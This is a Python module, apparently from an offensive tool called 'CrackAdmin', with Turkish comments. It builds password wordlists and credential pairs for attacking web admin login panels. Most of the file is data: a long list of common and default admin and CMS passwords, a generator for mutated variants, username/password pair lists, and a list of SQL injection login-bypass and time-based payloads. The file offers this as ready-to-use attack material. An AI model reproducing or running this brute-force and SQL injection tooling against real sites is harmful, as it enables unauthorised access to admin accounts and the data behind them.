"""
CrackAdmin - Wordlist Manager (2000+ şifre, SQL injection)
"""
from pathlib import Path
from typing import List, Tuple
from config import WORDLIST_FILE, PAYLOADS_FILE

BASE_PASSWORDS = [
    # Yaygın admin şifreleri
    "admin","admin123","admin1234","admin12345","admin@123","admin2024","admin2025",
    "administrator","administrator123","password","password1","password123",
    "password1234","password@123","pass123","pass1234","pass@word",
    "123456","1234567","12345678","123456789","1234567890","12345",
    "qwerty","qwerty123","qwerty1234","qwerty@123","qwertyuiop",
    "abc123","abc1234","abc12345","abcdef","abcd1234",
    "letmein","letmein1","letmein123","iloveyou","trustno1",
    "dragon","baseball","monkey","master","sunshine","welcome",
    "shadow","superman","batman","123123","111111","000000",
    "root","root123","root1234","root@123","toor","r00t",
    "test","test123","test1234","testing","test@123","Test123",
    "user","user123","user1234","guest","guest123","guest@123",
    "webmaster","webmaster123","manager","manager123","support","support123",
    "info","info123","contact","contact123","hello","hello123",
    "welcome","welcome1","welcome123","login","login123","access","access123",
    # Türkçe admin
    "sifre","sifre123","parola","parola123","gizli","gizli123",
    "yonetici","yonetici123","sistem","sistem123","guvenlik",
    # Yıl varyasyonları
    "admin2018","admin2019","admin2020","admin2021","admin2022",
    "admin2023","admin2024","admin2025","pass2023","pass2024","pass2025",
    "password2023","password2024","password2025",
    # Büyük/küçük
    "Admin","Admin123","Admin1234","Admin@123","ADMIN","ADMIN123",
    "Password","PASSWORD","Password123","PASSWORD123",
    "Root","ROOT","Root123","ROOT123","Test123","TEST123",
    # Özel karakterli
    "admin!","admin@","admin#","admin$","admin%",
    "admin!123","admin@123","admin#123","admin$123","admin!@#",
    "P@ssw0rd","P@$$w0rd","P@ssword","Pa$$word","Passw0rd",
    "Admin@2024","Admin#2024","Admin$2024","Admin!2024",
    "Adm1n","Adm1n123","@dmin","@dmin123","4dmin","4dmin123",
    # Numara-harf
    "a1b2c3","1a2b3c","abc123xyz","xyz123abc","admin007","admin1337",
    "pass007","pass1337","root007","test007","user007",
    # Boş / default
    "none","null","default","changeme","change_me","change123",
    "temp","temp123","temporary","initial","init123","setup","setup123",
    # Web panel
    "wp-admin","wpadmin","joomla","joomla123","drupal","drupal123",
    "cpanel","cpanel123","plesk","plesk123","whm","whm123",
    "webmin","webmin123","phpmyadmin","phpmyadmin123","pma","pma123",
    # DB default
    "mysql","mysql123","database","database123","server","server123",
    "backup","backup123","security","security123","firewall","network123",
    # Klavye pattern
    "qazwsx","qazwsxedc","zxcvbn","zxcvbnm","asdfgh","asdfghjkl",
    "qweasdzxc","1qaz2wsx","1q2w3e4r","1q2w3e","!qaz2wsx",
    # Email formatı
    "admin@admin.com","admin@localhost","admin@example.com",
    "test@test.com","user@user.com","root@root.com",
    "admin@site.com","webmaster@site.com","info@site.com",
    # Uzun / superadmin
    "administrator2024","administrator@2024","superadmin","superadmin123",
    "superuser","superuser123","sysadmin","sysadmin123",
    "systemadmin","systemadmin123","netadmin","netadmin123",
    # Popüler
    "love","sexy","money","master123","killer","ranger",
    "tiger","hockey","soccer","football","michael","jordan",
    "princess","jessica","thomas","charlie","andrew","robert",
    # Sayısal
    "100000","200000","123000","112358","246810","135790",
    "123abc","abc456","xyz789","11111111","22222222","33333333",
    # Kombinasyon
    "company","company123","corporate","corp123","office","office123",
    "business","business123","enterprise","enterprise123",
    "mysql_admin","db_admin","database_admin","sql_admin",
    # CMS
    "wordpress","wordpress123","joomla_admin","drupal_admin",
    "opencart","opencart123","prestashop","prestashop123",
    "magento","magento123",
]

SQL_PAYLOADS = [
    "' or '1'='1","' or '1'='1'--","' or '1'='1' #","' or '1'='1'/*",
    "' or 1=1--","' or 1=1 #","' or 1=1/*","admin'--","admin' #","admin'/*",
    "admin' or '1'='1","admin' or '1'='1'--","admin' or 1=1--",
    "' or ''='","' or '=' or '","' or 'x'='x","' or 'a'='a",
    "' or 1 --","' --","' #",
    "' UNION SELECT NULL--","' UNION SELECT 1--","' UNION SELECT 1,2--",
    "' UNION SELECT 1,2,3--","' UNION ALL SELECT NULL--",
    "1' UNION SELECT NULL,NULL--","admin' UNION SELECT 1--",
    "' AND '1'='1","' AND 1=1--","' AND 'a'='a",
    "'; WAITFOR DELAY '0:0:5'--","' AND SLEEP(5)--","' OR SLEEP(3)--",
    '" or "1"="1','" or "1"="1"--','admin" or "1"="1','admin"--',
    "or 1=1","or 1=1--","' or 1=1 LIMIT 1--",
    "admin')","admin') or ('1'='1","admin') or ('1'='1'--",
    "' OR '1'='1","' Or '1'='1","' OR 1=1--",
    "' IS NULL--","' IS NOT NULL--",
    "admin'-- -","admin'-- -\n","admin'/**/-",
    "' or 0x31=0x31--","%27 or %271%27=%271","%27 or 1=1--",
    "' or password LIKE '%","' or username LIKE 'admin%",
    "1 or 1=1","1' or '1'='1","' or true--","' or true #",
    "') or ('1'='1","') or 1=1--","')) or (('1'='1",
]

class WordlistManager:
    def __init__(self, log_fn=None):
        self._log = log_fn or print
        self.passwords: List[str] = []
        self.payloads:  List[str] = []
        self._load()

    def _load(self):
        if WORDLIST_FILE.exists():
            raw = WORDLIST_FILE.read_text(encoding="utf-8",errors="ignore").splitlines()
            self.passwords = [l.strip() for l in raw if l.strip()]
        else:
            self.passwords = self._build()
            WORDLIST_FILE.write_text("\n".join(self.passwords), encoding="utf-8")
        self._log(f"Wordlist: {len(self.passwords):,} şifre")

        if PAYLOADS_FILE.exists():
            raw = PAYLOADS_FILE.read_text(encoding="utf-8",errors="ignore").splitlines()
            self.payloads = [l.strip() for l in raw if l.strip()]
        else:
            self.payloads = SQL_PAYLOADS[:]
            PAYLOADS_FILE.write_text("\n".join(self.payloads), encoding="utf-8")
        self._log(f"Payloadlar: {len(self.payloads):,} SQL payload")

    def _build(self) -> List[str]:
        pool = list(BASE_PASSWORDS)
        extras = []
        for w in BASE_PASSWORDS[:100]:
            if not w or len(w) > 20:
                continue
            extras += [
                w+"!",w+"@",w+"#",w+"1",w+"01",w+"2024",w+"2025",
                w.capitalize(),w.upper(),w[::-1],"!"+w,"@"+w,
                w.replace("a","@").replace("e","3").replace("o","0").replace("i","1"),
                w.replace("s","$").replace("i","1").replace("o","0"),
            ]
        pool.extend(extras)
        for base in ["admin","password","pass","root","test","user","web","manager"]:
            for n in range(1, 101):
                pool.append(f"{base}{n}")
            for y in range(2018, 2026):
                pool.append(f"{base}{y}")

        seen, result = set(), []
        for p in pool:
            if p not in seen:
                seen.add(p)
                result.append(p)
        return result

    def get_passwords(self) -> List[str]:
        return self.passwords

    def get_payloads(self) -> List[str]:
        return self.payloads

    def get_credentials(self, usernames: List[str] = None) -> List[Tuple[str,str]]:
        if usernames is None:
            usernames = [
                "admin","administrator","root","user","test",
                "webmaster","manager","support","info","guest","web",
            ]
        pairs = []
        for u in usernames:
            for p in self.passwords:
                pairs.append((u, p))
            for domain in ["@admin.com","@site.com","@localhost","@example.com"]:
                for p in self.passwords[:50]:
                    pairs.append((u+domain, p))
        return pairs

    def add_external(self, filepath: str) -> int:
        try:
            raw = Path(filepath).read_text(encoding="utf-8",errors="ignore").splitlines()
            existing = set(self.passwords)
            new = [l.strip() for l in raw if l.strip() and l.strip() not in existing]
            self.passwords.extend(new)
            WORDLIST_FILE.write_text("\n".join(self.passwords), encoding="utf-8")
            return len(new)
        except Exception as e:
            self._log(f"Hata: {e}")
            return 0

    def stats(self) -> dict:
        return {
            "passwords":   len(self.passwords),
            "payloads":    len(self.payloads),
            "credentials": len(self.passwords) * 11,
        }
